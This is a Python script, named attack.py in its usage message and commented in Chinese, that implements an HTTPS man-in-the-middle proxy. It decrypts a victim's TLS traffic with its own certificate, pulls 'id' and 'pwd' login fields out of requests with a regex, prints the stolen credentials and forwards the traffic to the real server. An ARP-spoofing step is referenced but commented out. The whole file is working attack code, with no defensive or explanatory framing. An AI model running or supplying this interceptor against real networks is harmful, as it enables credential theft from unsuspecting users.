import socket
import ssl
import threading
import sys
import time
from scapy.all import *

# 設定證書路徑
CERT_FILE = "certificates/host.crt"
KEY_FILE = "certificates/host.key"

# MITM 代理伺服器
def mitm_proxy(client_socket, victim_ip):
    try:
        # 接收受害者的 HTTPS 請求
        request = client_socket.recv(4096)
        print(f"[*] 來自 {victim_ip} 的請求: {request[:50]}...")

        # 解析請求目標 (找到 Host)
        lines = request.split(b"\r\n")
        host = None
        for line in lines:
            if line.startswith(b"Host:"):
                host = line.split(b" ")[1].decode()
                break

        if not host:
            print("[!] 找不到 Host，無法轉發請求")
            return

        print(f"[*] 轉發請求到 {host}")

        # 連線到真正的 HTTPS 伺服器
        server_socket = socket.create_connection((host, 443))
        context = ssl.create_default_context()
        server_socket = context.wrap_socket(server_socket, server_hostname=host)
        server_socket.sendall(request)

        # 接收伺服器回應
        response = server_socket.recv(4096)
        print(f"[*] 伺服器回應: {response[:50]}...")

        # 回傳給受害者
        client_socket.sendall(response)

        server_socket.close()

    except Exception as e:
        print(f"[!] MITM 轉發錯誤: {e}")

    finally:
        client_socket.close()

def mitm_proxy2(client_socket, victim_ip):
    try:
        client_socket.settimeout(2.0)  # 設定受害者 socket timeout
        request = b""
        
        # 讀取完整的受害者 HTTPS 請求
        while True:
            try:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                request += chunk
            except socket.timeout:
                # print("[!] 受害者請求接收超時，結束讀取")
                break  # 超時後結束讀取

        # print(f"[*] 來自 {victim_ip} 的請求: {request[:50]}...")

        # # 使用正則表達式匹配 id 和 pwd
        match = re.search(b"\nid=([^&]+)&pwd=([^&]+)", request)
        if match:
            user_id = match.group(1).decode()
            password = match.group(2).decode()
            # print(f"[!!!] 攔截的帳號密碼: id={user_id}, pwd={password}")
            print(f"id: {user_id}, password: {password}")

        # 解析請求目標 (找到 Host)
        lines = request.split(b"\r\n")
        host = None
        for line in lines:
            if line.startswith(b"Host:"):
                host = line.split(b" ")[1].decode()
                break

        if not host:
            # print("[!] 找不到 Host，無法轉發請求")
            return

        # print(f"[*] 轉發請求到 {host}")

        # 連線到真正的 HTTPS 伺服器
        server_socket = socket.create_connection((host, 443))
        context = ssl.create_default_context()
        server_socket = context.wrap_socket(server_socket, server_hostname=host)
        server_socket.settimeout(2.0)  # 設定伺服器 socket timeout
        server_socket.sendall(request)
        try:
            ip_address = socket.gethostbyname(host)  # 解析域名為 IP
            print(f"TLS Connection Established : [{ip_address}:443]")
        except socket.gaierror:
            print(f"[!] 無法解析 {host}，使用原始域名")
            print(f"TLS Connection Established : [{host}:443]")


        # 讀取並轉發伺服器回應
        while True:
            try:
                response = server_socket.recv(4096)
                if not response:
                    break
                client_socket.sendall(response)
            except socket.timeout:
                # print("[!] 伺服器回應接收超時，結束讀取")
                break  # 超時後結束讀取

        # print(f"[*] 轉發完成，關閉連線")

        server_socket.close()

    except Exception as e:
        print(f"[!] MITM 轉發錯誤: {e}")

    finally:
        client_socket.close()


# 監聽 HTTPS 流量
def start_https_listener(interface):
    # print(f"[*] 監聽 {interface} 上的 HTTPS 流量...")
    
    # 創建 TCP 伺服器
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 8080))  # 監聽 HTTPS
    server_socket.listen(5)

    # 使用 SSL 包裝伺服器
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

    while True:
        client_socket, client_addr = server_socket.accept()
        # print(f"[*] 來自 {client_addr} 的連線")
        # print(f"TLS Connection Established : [{client_addr[0]}:{client_addr[1]}]")
        
        # 用 SSL 解密受害者的請求
        client_socket = context.wrap_socket(client_socket, server_side=True)
        
        # 啟動新執行緒處理請求
        # thread = threading.Thread(target=mitm_proxy, args=(client_socket, client_addr[0]))
        thread = threading.Thread(target=mitm_proxy2, args=(client_socket, client_addr[0]))
        thread.start()

def main():
    if len(sys.argv) != 4:
        print("Usage: sudo python3 ./attack.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    # 啟動 ARP Spoofing
    # arp_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, interface))
    # arp_thread.start()

    # 監聽 HTTPS 流量
    start_https_listener(interface)

if __name__ == "__main__":
    main()
